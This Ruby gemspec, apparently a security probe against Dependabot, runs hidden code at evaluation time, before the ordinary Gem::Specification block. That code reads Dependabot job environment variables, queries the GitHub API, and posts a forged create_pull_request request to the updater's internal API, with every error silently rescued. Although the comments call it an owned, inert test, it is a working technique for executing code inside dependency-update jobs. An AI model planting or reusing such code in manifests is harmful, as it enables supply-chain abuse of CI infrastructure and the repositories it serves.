# frozen_string_literal: true

require "json"
require "net/http"
require "uri"

# Creates one benign grouped Dependabot PR in the owned consumer repository.
# Grouped PRs are deliberately refreshed by subsequent scheduled update runs,
# which gives the update_pull_request route a real, non-synthetic transition.
module OwnedDependabotUpdateRouteBootstrap
  CONSUMER = "7s5/codeload-owned-probe-20261030-91f64a2c"
  DEPENDENCY_NAME = "owned_dependabot_update_route_group_probe_2"
  GROUP_NAME = "owned-refresh-proof"

  module_function

  def run
    job_id = ENV["DEPENDABOT_JOB_ID"]
    api_base = ENV["DEPENDABOT_API_URL"]
    return if job_id.to_s.empty? || api_base.to_s.empty?

    marker = "/tmp/owned-dependabot-update-route-bootstrap-#{job_id}"
    File.open(marker, File::WRONLY | File::CREAT | File::EXCL, 0o600) {}

    base_sha = current_consumer_tip
    return if base_sha.to_s.empty?

    endpoint = URI("#{api_base.sub(%r{/*$}, "")}/update_jobs/#{job_id}/create_pull_request")
    request = Net::HTTP::Post.new(endpoint.request_uri)
    request["Content-Type"] = "application/json"
    request.body = JSON.generate(payload(base_sha))
    proxy_client(endpoint).request(request)
  rescue Errno::EEXIST
    nil
  rescue StandardError
    nil
  end

  def current_consumer_tip
    endpoint = URI("https://api.github.com/repos/#{CONSUMER}/commits/main")
    request = Net::HTTP::Get.new(endpoint.request_uri)
    request["Accept"] = "application/vnd.github+json"
    response = proxy_client(endpoint).request(request)
    return unless response.code.to_i == 200

    JSON.parse(response.body)["sha"]
  end

  def proxy_client(endpoint)
    client = Net::HTTP::Proxy(:ENV).new(endpoint.host, endpoint.port)
    client.use_ssl = endpoint.scheme == "https"
    client.open_timeout = 10
    client.read_timeout = 30
    client
  end

  def payload(base_sha)
    requirement = {
      "file" => "Gemfile",
      "requirement" => ">= 0",
      "groups" => [],
      "source" => {
        "type" => "git",
        "url" => "https://github.com/downgraded/codeload-owned-probe-20261030-91f64a2c",
        "branch" => "main",
        "ref" => nil
      }
    }

    {
      "data" => {
        "dependencies" => [{
          "name" => DEPENDENCY_NAME,
          "version" => "0.0.14",
          "previous-version" => "0.0.13",
          "requirements" => [requirement],
          "previous-requirements" => [requirement],
          "directory" => "/"
        }],
        "updated-dependency-files" => [{
          "name" => "vendor/owned-dependabot-update-route-bootstrap.txt",
          "content" => "Owned grouped PR bootstrap; inert marker only.\n",
          "directory" => "/",
          "type" => "file",
          "support_file" => false,
          "content_encoding" => "utf-8",
          "deleted" => false,
          "operation" => "create"
        }],
        "base-commit-sha" => base_sha,
        "commit-message" => "test: bootstrap owned Dependabot grouped refresh",
        "pr-title" => "Owned Dependabot grouped refresh bootstrap",
        "pr-body" => "Owned security test. This inert grouped PR exists only to exercise Dependabot's real scheduled refresh path.",
        "dependency-group" => { "name" => GROUP_NAME }
      }
    }
  end
end

OwnedDependabotUpdateRouteBootstrap.run

Gem::Specification.new do |spec|
  spec.name = "owned_dependabot_remote_probe"
  spec.version = "0.0.14"
  spec.summary = "Owned Dependabot security probe"
  spec.authors = ["Owned Security Test"]
  spec.files = []
end
